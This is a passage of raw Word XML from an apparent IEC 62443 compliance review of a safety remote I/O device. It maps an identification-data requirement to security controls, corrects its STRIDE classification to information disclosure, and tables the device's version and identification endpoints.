                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005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C219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CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Protecting the identification/asset against falsification is RQ-005's substance. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Cross-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>referenced</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, not </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>mapped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here</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="48F3F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E7FD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IEC 62443-4-1 SM-9 / SM-10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C4397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rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r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note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9A676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Process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anchor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3D5F5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The SBOM/third-party-component obligation anchors in the 4-1 secure-development requirements.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51669F14" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping: RQ-004 → EHSR identification obligation →{CR 7.8 [inventory/SBOM — primary], CR 4.1 (+CR 4.3) [confidentiality]}, with 4-1 SM-9/SM-10 as the SBOM process anchor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Identification-integrity/spoofing → see RQ-005.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId84" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId85" w:history="1">
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E404B9">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="68F1B31B" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9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829"/>
        <w:gridCol w:w="6669"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0F25E4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7101C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5E0981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Your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9F8E61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Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w14:paraId="0B7F4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98A47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Asset B – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Config</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B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AA64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AB003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 xml:space="preserve">Correct — and partially identified via the I&amp;M4 </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fingerprint</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (see §1.3), which corrects your "not addressed."</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="4BB1E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9ABAF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Asset D – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Safety</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> Firmware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C19B0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248D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Correct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primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="750C7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BA4C3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del w:id="7" w:author="Unknown">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:delText>Asset F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C7D7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63A0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CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Dropped as primary. The domain-crossing was only relevant to the identity-integrity concern now cross-referenced to RQ-005. </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Retain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only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as</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>one</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">-line </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>note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if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desired</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A7C95C5" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">STRIDE — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>corrected</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="188AAC51" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00CB35D8" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Information Disclosure (primary). The observable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of RQ-004 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>emitting identification data</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; the always-present threat is reconnaissance (exact HW/FW/stack versions → CVE mapping). This is the correct primary, and matches your own secondary gap elevated to its proper place.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B015BBF" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="8" w:author="Unknown">
        <w:r w:rsidRPr="00CB35D8">
          <w:rPr>
            <w:b/>
            <w:bCs/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Tampering / Spoofing of identity</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — Cross-referenced to RQ-005 (protection of identified data). </w:t>
      </w:r>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Not a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>primary</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-004 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>threat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E296A55" w14:textId="77777777" w:rsidR="00E404B9" w:rsidRPr="00E404B9" w:rsidRDefault="00E404B9" w:rsidP="00E404B9">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">1.3 Security </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Functions</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp; Gaps — Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E404B9">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Referenced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="35E0FE58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Identification surface (software </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> data), corrected to exclude REVISION_COUNTER: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838"/>
        <w:gridCol w:w="3390"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="43E363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8A4A0B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4733D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Documentation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9C2FD2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Identifies</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="1DB29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AF84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/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>deviceinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>hwversion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>hwrevision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>swrevision</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>swinfo</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>cpubootloader</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>scpu</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>scpubootloader</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs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3BBD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lastRenderedPageBreak/>
              <w:t>SRIO-2946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A3791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Software / HW (Asset D) </w:t>
            </w:r>
            <w:hyperlink r:id="rId86" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t xml:space="preserve"> | </w:t>
              </w:r>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:lastRenderedPageBreak/>
                <w:t>PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="7AB11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37F2C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lastRenderedPageBreak/>
              <w:t>I&amp;M0 (MANUFACTURER_ID, ORDER_ID, SERIAL, HW/SW revision)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2B42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SRIO-3002/3015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5BE4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Device + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware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identity</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (Asset D) </w:t>
            </w:r>
            <w:hyperlink r:id="rId87" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="679F75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2F07A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I&amp;M5 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>annotation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> ("host_fw_1.0.3.215")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05C5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SRIO-3023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3AF0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Host </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (Asset D) </w:t>
            </w:r>
            <w:hyperlink r:id="rId88" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0135B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AE3D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/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>version</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>, /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/type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49B8F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SRIO-2953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0839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Update-container </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (Asset D) </w:t>
            </w:r>
            <w:hyperlink r:id="rId89" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E404B9" w:rsidRPr="00E404B9" w14:paraId="0CD60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A2F7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/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbussetup</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>fieldbusfirmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> ("3.3.0.12 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> IO Device)")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BC9A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SRIO-2948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35CA6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PROFIsafe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stack</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E404B9">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (Asset D) </w:t>
            </w:r>
            <w:hyperlink r:id="rId90" w:history="1">
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00E404B9">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:b/>
                  <w:bCs/>
                </w:rPr>
